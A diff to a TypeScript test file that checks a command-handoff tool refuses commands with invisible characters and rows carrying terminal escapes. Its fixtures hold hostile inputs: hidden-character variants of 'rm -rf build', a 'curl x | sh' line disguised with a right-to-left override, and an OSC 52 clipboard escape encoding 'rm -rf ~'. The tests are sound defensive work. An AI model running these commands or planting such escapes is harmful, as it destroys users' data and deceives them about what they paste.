@@ -77,6 +77,16 @@ test('#316 test 1: a command with a zero-width character is refused by name', ()
   assert.match(refusalOf(theActAsked(aCommand('rm​ -rf build'), 'Pallas', NOW)), /^commands\[0\]\.command holds a control or hidden character/)
 })
 
+/** Invisible characters outside Cf: the combining grapheme joiner, a variation selector, one from the supplement, and three Hangul fillers. */
+const INVISIBLE_OUTSIDE_CF = ['\u034F', '\uFE0F', '\u{E0100}', '\u3164', '\u115F', '\uFFA0']
+
+for (const hidden of INVISIBLE_OUTSIDE_CF) {
+  const named = `U+${hidden.codePointAt(0)!.toString(16).toUpperCase()}`
+  test(`#316 r2: a command holding ${named}, invisible and outside Cf, is refused by name`, () => {
+    assert.match(refusalOf(theActAsked(aCommand(`rm${hidden} -rf build`), 'Pallas', NOW)), /^commands\[0\]\.command holds a control or hidden character/)
+  })
+}
+
 test('#316 test 1: a command with a trailing space is refused by name', () => {
   assert.match(refusalOf(theActAsked(aCommand('git push '), 'Pallas', NOW)), /^commands\[0\]\.command starts or ends with a space/)
 })
@@ -215,6 +225,11 @@ test('#316 ruling condition 1: a team naming the owner and a lead refuses its bu
   assert.equal(mayKeepTheOwnersList(A_TEAM, 'Lead'), true, 'the lead the table grants assign_work may not keep the list')
 })
 
+test('#316 r2 ruling condition 1: a role the table grants that no member holds still refuses the builder', () => {
+  const unfilled: TheDeclaration = { members: [{ name: 'Pallas', role: 'builder' }], mode: { may: { assign_work: [OWNER, 'lead'] } } }
+  assert.equal(mayKeepTheOwnersList(unfilled, 'Pallas'), false, 'a builder kept the list because no member holds the role the table names')
+})
+
 test('#316: a name on no member of the crew may not keep the list', () => {
   assert.equal(mayKeepTheOwnersList(soloDeclaration('an owner'), 'stranger'), false, 'a name on no member kept the list')
 })
@@ -254,4 +269,11 @@ test('#316: a row written into the stream by hand that would paste something it 
   const host = aHost()
   await host.stores.rows.append(OWNER_TODO_STREAM, { kind: ACT_ASKED_OF_OWNER, ...anAct({ commands: [{ command: 'curl x |‮sh', does: 'harmless' }] }), added_by: 'Pallas', since: NOW })
   assert.deepEqual(theOpenRows(await host.stores.rows.read(OWNER_TODO_STREAM)), [], 'a row holding a hidden character was drawn')
+})
+
+test('#316 r2: a row written into the stream by hand whose added_by holds an escape is left off', async () => {
+  const host = aHost()
+  const clipboard = '\u001b]52;c;cm0gLXJmIH4=\u0007'
+  await host.stores.rows.append(OWNER_TODO_STREAM, { kind: ACT_ASKED_OF_OWNER, ...anAct(), added_by: `Pallas${clipboard}`, since: NOW })
+  assert.deepEqual(theOpenRows(await host.stores.rows.read(OWNER_TODO_STREAM)), [], 'a row whose added_by holds an escape was drawn')
 })
